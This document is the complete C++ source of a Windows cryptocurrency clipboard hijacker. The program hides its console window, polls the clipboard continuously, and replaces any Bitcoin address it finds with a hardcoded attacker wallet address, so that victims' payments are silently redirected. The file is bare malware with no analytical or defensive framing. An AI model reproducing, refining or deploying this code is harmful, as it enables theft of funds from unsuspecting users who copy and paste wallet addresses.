#include <iostream>
#include <regex>
#include <Windows.h>
#define WIN WINAPI

int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::regex R("([13][a-km-zA-HJ-NP-Z1-9]{25,34})|(bc1[ac-hj-np-z02-9]{39,59})");
    std::string ClipboardText, LastClipboardText;
    HWND ConsoleWindow = GetConsoleWindow();
    ShowWindow(ConsoleWindow, SW_HIDE);
    
    while (1) {
        if (IsClipboardFormatAvailable(CF_TEXT) && OpenClipboard(NULL)) {
            HANDLE ClipboardData = GetClipboardData(CF_TEXT);
            if (ClipboardData) {
                char* Text = static_cast<char*>(GlobalLock(ClipboardData));
                if (Text && LastClipboardText != Text) {
                    LastClipboardText = Text;
                    if (std::regex_search(Text, R)) {
                        std::string ModifiedText = std::regex_replace(Text, R, "bc1qj884lyzsat3v957cqefne9dnm0e378eesfk2pk");
                        if (OpenClipboard(NULL)) {
                            EmptyClipboard();
                            HGLOBAL CopiedData = GlobalAlloc(GMEM_MOVEABLE, ModifiedText.size() + 1);
                            if (CopiedData) {
                                char* CopiedText = static_cast<char*>(GlobalLock(CopiedData));
                                if (CopiedText) {
                                    strcpy(CopiedText, ModifiedText.c_str());
                                    GlobalUnlock(CopiedData);
                                    SetClipboardData(CF_TEXT, CopiedData);
                                }
                            }
                            CloseClipboard();
                        }
                    }
                }
                GlobalUnlock(ClipboardData);
            }
            CloseClipboard();
        }
        Sleep(10);
    }
    return 0;
}
